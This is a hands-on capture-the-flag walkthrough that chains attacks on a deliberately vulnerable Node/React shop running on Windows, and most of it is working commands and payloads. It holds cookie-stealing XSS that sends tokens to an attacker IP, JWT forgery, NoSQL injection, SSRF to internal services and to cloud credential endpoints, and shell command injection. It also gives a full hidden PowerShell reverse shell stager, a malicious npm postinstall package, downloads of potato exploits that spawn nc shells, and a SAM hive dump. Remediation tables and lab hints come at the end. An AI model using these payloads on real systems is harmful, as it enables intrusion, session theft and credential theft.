# ProShop CTF Lab — Hard Difficulty
# Complete Walkthrough: 18-Phase Exploit Chain to Windows RCE
**Difficulty:** Hard  
**Category:** Web, SSRF, JWT, XSS, RCE, Privilege Escalation  
**Stack:** MERN (MongoDB, Express, React, Node.js)  
**Target OS:** Windows  
**CVE-style IDs:** INFO-001, XSS-001, JWT-001, IDOR-001, NOSQLI-001, SSRF-001, RCE-001/2/3/4

---

## Lab Architecture

```
[ Attacker Machine ]
        │
        ▼ TCP :3000 (React) / :5000 (API)
[ Target: Windows Host ]
   ├── Node.js Express API      :5000  (externally accessible)
   ├── React Frontend           :3000  (externally accessible)
   ├── MongoDB                  :27017 (localhost only)
   └── Internal Plugin Service  :6000  (127.0.0.1 ONLY — no external access)
        └── Plugin Installer (RCE)
```

**Goal:** Execute a PowerShell reverse shell on the Windows host via the following chain:
```
Recon → Info Disclosure → Stored XSS → Cookie Theft → JWT Forge → IDOR/NoSQLi → SSRF → Internal Service → RCE
```

---

## Phase 1: Reconnaissance & Service Enumeration

### 1.1 Port Scanning
```bash
# Initial TCP scan
nmap -sV -sC -p- --min-rate 5000 TARGET_IP -oN nmap_initial.txt

# Expected open ports:
#   3000/tcp  Node.js (React frontend)
#   5000/tcp  Node.js Express API
#   27017/tcp MongoDB (check if exposed — should be closed)
```

### 1.2 Web Technology Fingerprinting
```bash
# Identify frameworks and headers
curl -I http://TARGET_IP:5000/api/products
# Look for: X-Powered-By: Express, Set-Cookie patterns

whatweb http://TARGET_IP:3000
# Look for: React, Node.js, JWT cookie names
```

### 1.3 Directory and File Enumeration
```bash
# Enumerate hidden files and backup configs on the web root
gobuster dir -u http://TARGET_IP:5000 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -x bak,old,env,conf,txt,json \
  -o gobuster_root.txt

# Key finds:
#   /.env.bak        → CRITICAL: legacy environment backup
#   /package.json.old → Internal service paths, bot credentials
```

### 1.4 API Endpoint Discovery
```bash
# Enumerate API routes
ffuf -u http://TARGET_IP:5000/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt \
  -mc 200,201,400,401,403

# Discovered:
#   /api/products      GET  (public product list)
#   /api/users/auth    POST (login)
#   /api/users         POST (register)
#   /api/support       GET/POST (authenticated)
#   /api/admin/dashboard GET (admin only — 403 hint)
```

---

## Phase 2: Information Disclosure — Leaked Environment File

### 2.1 Fetch .env.bak
```bash
curl http://TARGET_IP:5000/.env.bak
# Or via static file serving:
curl http://TARGET_IP:3000/.env.bak
```

**Response (CWE-312 — VULN-ID: INFO-001):**
```ini
LEGACY_SECRET="old-forgotten-secret-2024"
INTERNAL_SERVICE_PORT=6000
INTERNAL_SERVICE_HOST=127.0.0.1
```

**Key findings:**
- `LEGACY_SECRET="old-forgotten-secret-2024"` → Used in Stage 5 to forge JWT
- Internal service runs on `127.0.0.1:6000` → Target for SSRF (Stage 6)

### 2.2 Analyze package.json.old
```bash
curl http://TARGET_IP:5000/package.json.old
```

**Response (CWE-538 — VULN-ID: INFO-002):**
```json
{
  "_internal_notes": {
    "admin_route": "/api/admin/dashboard",
    "internal_service": "http://127.0.0.1:6000",
    "plugin_endpoint": "/api/internal/plugin/install",
    "bot_credentials": "admin@proshop.com / Admin1234!"
  }
}
```

> **Note:** Bot credentials reveal the admin email (useful for targeted XSS). The internal service path is confirmed.

---

## Phase 3: Account Creation & Hardening Verification

### 3.1 Register a Standard User Account
```bash
curl -X POST http://TARGET_IP:5000/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"pwner","email":"pwner@evil.com","password":"Password123!"}'
```

### 3.2 Verify Mass-Assignment is Blocked (Stage 1 Hardening)
```bash
# Attempt to register as admin via mass-assignment
curl -X POST http://TARGET_IP:5000/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"hacker@evil.com","password":"Password123!","isAdmin":true,"role":"Admin"}'

# Expected: 201 Created, but isAdmin=false in response
# The hardening in userController.js strictly destructures only name/email/password
```

### 3.3 Login and Save User Token
```bash
curl -c cookies.txt -X POST http://TARGET_IP:5000/api/users/auth \
  -H "Content-Type: application/json" \
  -d '{"email":"pwner@evil.com","password":"Password123!"}'

# Response: { _id, name, email, isAdmin: false }
# Cookie file now contains: jwt=<USER_JWT>
USER_TOKEN=$(grep jwt cookies.txt | awk '{print $NF}')
```

---

## Phase 4: Stored XSS Reconnaissance

### 4.1 Enumerate Products
```bash
curl http://TARGET_IP:5000/api/products | jq '.products[] | {_id, name}'

# Note the product IDs — the admin bot visits these pages
# Example: 64abc111000000000000001 (Airpods)
PRODUCT_ID="64abc111000000000000001"
```

### 4.2 Test XSS Reflection
```bash
# First, test a benign review
curl -b "jwt=$USER_TOKEN" -X POST \
  http://TARGET_IP:5000/api/products/$PRODUCT_ID/reviews \
  -H "Content-Type: application/json" \
  -d '{"rating":5,"comment":"<b>Bold test</b>"}'

# Navigate to the product page in browser
# http://TARGET_IP:3000/product/PRODUCT_ID
# If you see bold text rendered — the dangerouslySetInnerHTML sink is confirmed
```

### 4.3 Confirm XSS Execution
```bash
# Inject an alert payload to confirm JS execution
curl -b "jwt=$USER_TOKEN" -X POST \
  http://TARGET_IP:5000/api/products/$PRODUCT_ID/reviews \
  -H "Content-Type: application/json" \
  -d '{"rating":5,"comment":"<img src=x onerror=alert(1)>"}'

# Visit the product page in browser — alert(1) fires
# XSS-001 confirmed
```

---

## Phase 5: XSS Token Exfiltration — Cookie Theft

### 5.1 Start the Collector on Your Attack Machine
```bash
# On attack machine (ensure port 9000 is open/accessible from target)
node lab-tools/collector.js 9000
# Or: python3 -m http.server 9000  (simple alternative)
```

### 5.2 Inject the Cookie-Stealing XSS Payload
```bash
ATTACKER_IP="10.10.14.5"
COLLECTOR_PORT="9000"

# img onerror payload — most compatible
PAYLOAD='<img src=x onerror="fetch('"'"'http://'"$ATTACKER_IP"':'"$COLLECTOR_PORT"'/steal?c='"'"'+encodeURIComponent(document.cookie))">'

curl -b "jwt=$USER_TOKEN" -X POST \
  http://TARGET_IP:5000/api/products/$PRODUCT_ID/reviews \
  -H "Content-Type: application/json" \
  -d "{\"rating\":5,\"comment\":\"$PAYLOAD\"}"
```

**Alternative — more stealth (no visible img):**
```bash
PAYLOAD='<svg onload="var i=new Image;i.src='"'"'http://10.10.14.5:9000/steal?c='"'"'+document.cookie">'
```

### 5.3 Wait for Admin Bot (up to 60 seconds)
The admin bot visits product review pages every 60 seconds. When it visits:
1. The XSS payload fires in the bot's Chromium browser
2. `document.cookie` contains the admin's `jwt` cookie (httpOnly=false)
3. The cookie is sent to your collector

**Collector output:**
```
======================================================================
[2024-11-14T...] 🍪 COOKIE STOLEN!
  From URL   : http://localhost:3000/product/64abc111000000000000001
  Client IP  : 127.0.0.1
  Cookie Raw : jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO...

  ⭐ JWT TOKEN: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO...
======================================================================
```

### 5.4 Decode the Admin JWT
```bash
ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Decode payload (base64)
echo $ADMIN_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# Output: { "userId": "64abc000000000000000001", "isAdmin": true, ... }
ADMIN_ID="64abc000000000000000001"
```

### 5.5 Verify Admin Access
```bash
curl -b "jwt=$ADMIN_TOKEN" http://TARGET_IP:5000/api/users | jq .
# Returns full user list — admin access confirmed
```

---

## Phase 6: JWT Key-Confusion Analysis

> At this point you have a real admin token. The JWT key-confusion vulnerability (JWT-001) is the *alternative* path if XSS fails — and is required understanding for the final privilege escalation chain.

### 6.1 Identify the Algorithm Confusion
```bash
# Decode the token header
echo $ADMIN_TOKEN | cut -d. -f1 | base64 -d 2>/dev/null
# {"alg":"HS256","typ":"JWT"}  ← Still HS256 even in "production"

# The middleware verifies with JWT_SECRET first, then falls back to LEGACY_SECRET
# This means tokens signed with LEGACY_SECRET are ALSO accepted
```

### 6.2 Forge an Admin Token (Alternative Path / Key-Confusion Demo)
```bash
# Using Node.js exploit script
node lab-tools/forge_token.js --adminId=$ADMIN_ID

# Using Python exploit script
python3 lab-tools/forge_token.py --admin-id $ADMIN_ID --verify --target http://TARGET_IP:5000
```

**Output:**
```
[+] Forged JWT:
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NGFiYzAwMDAwMDAwMDAwMDAwMDAwMSIsImlzQWRtaW4iOnRydWV9.XXXXX

[+] Token accepted: Admin access confirmed!
```

---

## Phase 7: IDOR — Admin Support Ticket Enumeration

### 7.1 Access Your Own Tickets
```bash
curl -b "jwt=$ADMIN_TOKEN" http://TARGET_IP:5000/api/support | jq .
```

### 7.2 IDOR — Access Admin Internal Ticket #1000
```bash
# Sequential ticketId enumeration (IDOR — CWE-639)
curl -b "jwt=$ADMIN_TOKEN" http://TARGET_IP:5000/api/support/1000 | jq .

# Response reveals internal admin notes:
# "internalNote": "INTERNAL: Admin dashboard at /api/admin/dashboard.
#   Plugin management endpoint: POST /api/admin/internal-proxy.
#   Internal plugin service reachable at http://127.0.0.1:6000.
#   Plugin installer: POST /plugin/install with {packageName}.
#   Debug exec endpoint: POST /plugin/exec with {cmd, usePs}."
```

### 7.3 NoSQL Injection — Alternative Discovery Method (VULN-ID: NOSQLI-001)
```bash
# Without knowing ticketId, use MongoDB operator injection
# URL-encode {"$gt":999} → %7B%22%24gt%22%3A999%7D

curl -b "jwt=$ADMIN_TOKEN" \
  "http://TARGET_IP:5000/api/support/%7B%22%24gt%22%3A999%7D" | jq .

# Returns the first ticket with ticketId > 999 = ticket #1000 (admin internal ticket)
# The JSON.parse() in customerController.js converts the URL param to a MongoDB operator
```

---

## Phase 8: Admin Dashboard Access & SSRF Reconnaissance

### 8.1 Access Admin Dashboard
```bash
curl -b "jwt=$ADMIN_TOKEN" http://TARGET_IP:5000/api/admin/dashboard | jq .

# Response:
# {
#   "message": "Admin Dashboard Active",
#   "internalService": "http://127.0.0.1:6000 (loopback only)",
#   "hint": "Remote Logistics Sync available at POST /api/admin/import-image"
# }
```

### 8.2 Enumerate the SSRF Attack Surface
The dashboard confirms:
- `POST /api/admin/import-image` → accepts `imageUrl` (SSRF-001)
- `POST /api/admin/internal-proxy` → accepts `url` + `body` (SSRF-002)

---

## Phase 9: SSRF — Internal Service Discovery

### 9.1 Probe the Internal Plugin Service via SSRF-001
```bash
# Use the image importer to probe 127.0.0.1:6000
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/import-image \
  -H "Content-Type: application/json" \
  -d '{"imageUrl":"http://127.0.0.1:6000/status"}'

# Response (proxied from internal service):
# {
#   "statusCode": 200,
#   "body": "{\"service\":\"ProShop Internal Plugin Manager\",
#             \"version\":\"1.2.0\",
#             \"os\":\"win32\",
#             \"node\":\"v18.x.x\",
#             \"endpoints\":[
#               \"GET  /status\",
#               \"GET  /plugin/list\",
#               \"POST /plugin/install\",
#               \"POST /plugin/exec\"
#             ]}"
# }
```

**Key findings from SSRF probe:**
- `os: "win32"` → Confirms Windows target (PowerShell stager needed)
- `/plugin/exec` → Undocumented direct command execution endpoint
- `/plugin/install` → Command injection via `packageName`

### 9.2 List Installed Plugins
```bash
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/import-image \
  -H "Content-Type: application/json" \
  -d '{"imageUrl":"http://127.0.0.1:6000/plugin/list"}'
```

---

## Phase 10: SSRF Pivot — Confirm POST Relay Capability

### 10.1 Test POST Body Relay via SSRF-002
```bash
# Use internal-proxy to send POST to internal service
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/internal-proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:6000/plugin/install",
    "method": "POST",
    "body": {"packageName": "lodash", "version": "4.17.21"}
  }'

# Response: plugin installed successfully (npm output)
# Confirms we can relay POST bodies to the internal service
```

---

## Phase 11: RCE Path 1 — Command Injection via packageName

### 11.1 Test Command Injection (VULN-ID: RCE-001 — CWE-78)
```bash
# The packageName is unsanitized — inject via semicolon
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/internal-proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:6000/plugin/install",
    "method": "POST",
    "body": {"packageName": "lodash; whoami", "version": "latest"}
  }'

# Response includes stdout from 'whoami' — confirming RCE
# Example: "stdout": "\r\nnt authority\\system\r\n"
```

### 11.2 Enumerate the System (Windows Recon)
```bash
# System info
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/internal-proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:6000/plugin/install",
    "method": "POST",
    "body": {"packageName": "x; systeminfo", "version": "latest"}
  }'

# Network config
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/internal-proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:6000/plugin/install",
    "method": "POST",
    "body": {"packageName": "x; ipconfig /all", "version": "latest"}
  }'
```

---

## Phase 12: RCE Path 2 — Direct Exec Endpoint (VULN-ID: RCE-003)

### 12.1 Use the Undocumented /plugin/exec Endpoint
```bash
# Execute arbitrary command directly
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/internal-proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:6000/plugin/exec",
    "method": "POST",
    "body": {"cmd": "whoami /priv", "usePs": false}
  }'
```

---

## Phase 13: Windows Reverse Shell — PowerShell Stager (Stage 6)

### 13.1 Start a Netcat Listener on Attack Machine
```bash
# Windows-compatible listener (use rlwrap for better shell experience)
rlwrap nc -lvnp 4444

# Or use a Metasploit handler:
# msf6> use exploit/multi/handler
# msf6> set payload windows/x64/powershell_reverse_tcp
# msf6> set LHOST 10.10.14.5
# msf6> set LPORT 4444
# msf6> run
```

### 13.2 Build the PowerShell Reverse Shell Payload
```python
# Generate the Base64-encoded PowerShell stager
python3 lab-tools/forge_token.py \
  --admin-id $ADMIN_ID \
  --rce \
  --lhost 10.10.14.5 \
  --lport 4444
```

**Or build manually:**
```python
import base64

LHOST = "10.10.14.5"
LPORT = 4444

ps_cmd = (
    f"$c=New-Object Net.Sockets.TcpClient('{LHOST}',{LPORT});"
    f"$s=$c.GetStream();"
    f"[byte[]]$b=0..65535|%{{0}};"
    f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
    f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
    f"$r=(iex $d 2>&1|Out-String);"
    f"$e=[Text.Encoding]::ASCII.GetBytes($r+'PS> ');"
    f"$s.Write($e,0,$e.Length)}};"
    f"$c.Close()"
)

b64 = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
stager = f"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {b64}"
print(stager)
```

### 13.3 Fire the Reverse Shell via /plugin/exec
```bash
STAGER="powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <BASE64_HERE>"

curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/internal-proxy \
  -H "Content-Type: application/json" \
  -d "{
    \"url\": \"http://127.0.0.1:6000/plugin/exec\",
    \"method\": \"POST\",
    \"body\": {\"cmd\": \"$STAGER\", \"usePs\": true}
  }"
```

**Listener catches the shell:**
```
Ncat: Connection from TARGET_IP.
PS C:\Users\NodeJS\AppData\Local\proshop> whoami
nt authority\network service
PS C:\Users\NodeJS\AppData\Local\proshop> 
```

---

## Phase 14: RCE Path 3 — Supply-Chain via Malicious Package Postinstall

### 14.1 Prepare the Malicious Package
```bash
# Edit LHOST/LPORT in lab-tools/malicious-package/postinstall.js
# Then serve the package directory via HTTP
cd lab-tools/malicious-package
python3 -m http.server 8888

# Or serve as a tarball:
npm pack
# → proshop-analytics-plugin-1.0.0.tgz
python3 -m http.server 8888
```

### 14.2 Point the Plugin Installer at Your Package
```bash
# Method 1: Direct npm URL (if outbound HTTP allowed from target)
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/internal-proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:6000/plugin/install",
    "method": "POST",
    "body": {
      "packageName": "http://10.10.14.5:8888/proshop-analytics-plugin-1.0.0.tgz",
      "version": "latest"
    }
  }'

# npm installs the package, triggering postinstall.js
# postinstall.js fires the PowerShell stager → reverse shell
```

### 14.3 Method 2 — Command Injection into packageName
```bash
# Directly inject the stager into packageName parameter
STAGER_B64="<BASE64_ENCODED_PS_CMD>"

curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/internal-proxy \
  -H "Content-Type: application/json" \
  -d "{
    \"url\": \"http://127.0.0.1:6000/plugin/install\",
    \"method\": \"POST\",
    \"body\": {
      \"packageName\": \"lodash ; powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $STAGER_B64\",
      \"version\": \"latest\"
    }
  }"
```

---

## Phase 15: Post-Exploitation & Privilege Escalation

### 15.1 Initial Shell Enumeration
```powershell
# From the reverse shell:
whoami /all
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
net user
net localgroup administrators
```

### 15.2 Check for Privileged Service Context
```powershell
# Node.js often runs as SYSTEM or Network Service in Docker/Windows Services
whoami /priv

# Look for:
# SeImpersonatePrivilege → Potato attacks (PrintSpoofer, GodPotato)
# SeBackupPrivilege → SAM/NTDS dump
# SeDebugPrivilege → Process injection
```

### 15.3 Privilege Escalation — PrintSpoofer (SeImpersonatePrivilege)
```powershell
# Download PrintSpoofer to target
iwr -Uri "http://10.10.14.5:8888/PrintSpoofer64.exe" -OutFile "C:\Windows\Temp\ps.exe"

# Execute as SYSTEM
C:\Windows\Temp\ps.exe -i -c "C:\Windows\Temp\nc64.exe -e cmd.exe 10.10.14.5 5555"
```

### 15.4 Privilege Escalation — GodPotato (Windows Server 2019+)
```powershell
iwr -Uri "http://10.10.14.5:8888/GodPotato-NET4.exe" -OutFile "C:\Windows\Temp\gp.exe"
C:\Windows\Temp\gp.exe -cmd "cmd /c C:\Windows\Temp\nc64.exe -e cmd.exe 10.10.14.5 5555"
```

---

## Phase 16: Flag Capture

### 16.1 Locate Flags
```powershell
# User flag (typically on the desktop of the running user)
type C:\Users\*\Desktop\user.txt

# Or search for flag files
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue | 
  Select-String "flag" 2>$null

# Root/Admin flag (after privilege escalation)
type C:\Users\Administrator\Desktop\root.txt
```

### 16.2 Dump Credentials for Lateral Movement
```powershell
# After SYSTEM access — dump SAM hive
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\sys.hive

# Exfiltrate and crack offline with impacket
# python3 secretsdump.py -sam sam.hive -system sys.hive LOCAL
```

---

## Phase 17: Alternative Attack Paths

### 17.1 Blind XSS via Product Description (Admin-Created Products)
```bash
# Admins create products — inject XSS in description field
# The admin bot may visit the product management page
curl -b "jwt=$ADMIN_TOKEN" -X POST http://TARGET_IP:5000/api/products \
  -H "Content-Type: application/json" \
  -d '{}'  # Creates sample product, then update with XSS payload
```

### 17.2 SSRF — Cloud Metadata Endpoint Probe
```bash
# If running on AWS EC2
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/import-image \
  -H "Content-Type: application/json" \
  -d '{"imageUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Azure IMDS
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://TARGET_IP:5000/api/admin/import-image \
  -H "Content-Type: application/json" \
  -d '{"imageUrl":"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}'
```

### 17.3 ReDoS via Keyword Search
```bash
# VULN-ID: NOSQLI-002 — unescaped regex in product search
# Craft a ReDoS payload to cause application lag
curl "http://TARGET_IP:5000/api/products?keyword=(a+)+$"
```

---

## Phase 18: Full Chain Summary & Remediation

### Complete Exploit Chain
```
Phase 1-2:  Recon + gobuster → .env.bak + package.json.old
Phase 3:    Register user, verify mass-assignment blocked (hardened)
Phase 4-5:  Stored XSS in product reviews → Admin bot steals cookie
Phase 6:    Decode JWT → get admin ObjectId
            (Alt: forge token with LEGACY_SECRET — JWT-001)
Phase 7:    IDOR /api/support/1000 → admin internal notes
            (Alt: NoSQL injection %7B%22%24gt%22%3A999%7D)
Phase 8-9:  Admin dashboard → SSRF → probe 127.0.0.1:6000
Phase 10:   SSRF POST relay → confirm RCE capability
Phase 11-14: RCE via cmd injection OR postinstall hook → PowerShell stager
Phase 15-16: Post-exploitation → SeImpersonatePrivilege → SYSTEM → flags
```

### Vulnerability Mapping
| Phase | VULN-ID | CWE | Severity |
|-------|---------|-----|----------|
| 2 | INFO-001 | CWE-312 | High |
| 2 | INFO-002 | CWE-538 | Medium |
| 4 | XSS-001 | CWE-79 | High |
| 5 | BOT-001 | CWE-359 | High |
| 6 | JWT-001 | CWE-347 | Critical |
| 7 | IDOR-001 | CWE-639 | High |
| 7 | NOSQLI-001 | CWE-943 | High |
| 9 | SSRF-001 | CWE-918 | Critical |
| 10 | SSRF-002 | CWE-918 | Critical |
| 11 | RCE-001 | CWE-78 | Critical |
| 13 | RCE-002 | CWE-94 | Critical |
| 14 | RCE-003 | CWE-78 | Critical |
| 15 | RCE-004 | CWE-78 | Critical |

### Remediations (Production Hardening)
| Vulnerability | Fix |
|---|---|
| INFO-001 | Remove `.env.bak` from web root; use `.gitignore`; rotate all secrets |
| XSS-001 | Use DOMPurify on backend; never use `dangerouslySetInnerHTML` with user content |
| BOT-001 | Set `httpOnly: true` on JWT cookies |
| JWT-001 | Enforce `algorithms: ['RS256']` in `jwt.verify()`; remove legacy fallback |
| IDOR-001 | Use UUID-based ticket IDs; always enforce ownership checks |
| NOSQLI-001 | Use `Number()` type coercion; never `JSON.parse()` URL params into DB queries |
| SSRF-001/2 | Implement URL allowlist; block RFC-1918 ranges; use DNS rebinding protection |
| RCE-001/3 | Never interpolate user input into shell commands; use `execFile()` with arrays |
| RCE-002 | Never install user-controlled packages; use package integrity verification |

---

## Appendix A: Quick Reference Commands

```bash
# Full exploit chain (copy-paste sequence)
export TARGET="10.10.10.X"
export ATTACKER="10.10.14.5"

# 1. Collect credentials
curl http://$TARGET:5000/.env.bak | grep LEGACY_SECRET

# 2. Register + get user token
curl -c cookies.txt -X POST http://$TARGET:5000/api/users/auth \
  -H "Content-Type: application/json" \
  -d '{"email":"pwner@evil.com","password":"Password123!"}'

# 3. Start XSS collector (separate terminal)
node lab-tools/collector.js 9000

# 4. Inject XSS
PRODUCT_ID="<from /api/products>"
USER_TOKEN="<from cookies.txt>"
curl -b "jwt=$USER_TOKEN" -X POST http://$TARGET:5000/api/products/$PRODUCT_ID/reviews \
  -H "Content-Type: application/json" \
  -d "{\"rating\":5,\"comment\":\"<img src=x onerror='fetch(\\\"http://$ATTACKER:9000/steal?c=\\\"+document.cookie)'>\"}"

# 5. Wait for bot... collect ADMIN_TOKEN

# 6. Forge token (alternative if bot fails)
node lab-tools/forge_token.js --adminId=<ADMIN_ID_FROM_JWT>

# 7. NoSQL injection to find internal routes
curl -b "jwt=$ADMIN_TOKEN" \
  "http://$TARGET:5000/api/support/%7B%22%24gt%22%3A999%7D"

# 8. SSRF probe
curl -b "jwt=$ADMIN_TOKEN" \
  -X POST http://$TARGET:5000/api/admin/import-image \
  -H "Content-Type: application/json" \
  -d '{"imageUrl":"http://127.0.0.1:6000/status"}'

# 9. Start listener (separate terminal)
rlwrap nc -lvnp 4444

# 10. RCE via /plugin/exec
python3 lab-tools/forge_token.py --admin-id $ADMIN_ID --rce --lhost $ATTACKER --lport 4444
# Copy the curl command from output and fire it
```

## Appendix B: Hints System (for Lab Operators)

| Trigger | Hint Level | Hint Text |
|---|---|---|
| 30min no progress | 1 | "Recon the web root carefully. Not all config files are hidden." |
| 45min no XSS | 2 | "Product reviews are not sanitized. Check how the frontend renders comment fields." |
| 60min no token | 3 | "The admin bot visits products pages every minute. Something accessible to JS shouldn't be." |
| 75min no forge | 4 | "The .env.bak contains a secret that still works. JWT algorithms can be confused." |
| 90min no SSRF | 5 | "The image importer doesn't validate loopback addresses. What's on port 6000?" |
| 120min no RCE | 6 | "The internal service has a /plugin/exec endpoint. packageName is passed to exec() unsanitized." |
